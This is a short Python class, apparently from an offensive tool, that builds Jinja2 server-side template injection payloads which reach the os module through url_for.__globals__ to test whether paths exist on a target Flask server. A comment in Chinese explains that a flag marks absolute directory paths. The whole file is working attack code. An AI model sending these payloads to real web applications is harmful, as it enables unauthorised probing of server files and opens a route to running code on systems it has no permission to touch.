class Isset:
    name=''
    payload=''
    #flag为1表示要cd的目录以'/'开头
    flag=0

    def __init__(self, name,dir):
       self.name = name
       if name[0]=='/':
           self.flag=1
           self.payload="{{url_for.__globals__.get('os').path.exists('" + name + "')}}"
       else:
           self.flag=0
           self.payload="{{url_for.__globals__.get('os').path.exists('" + dir + "/" + name + "')}}"
       
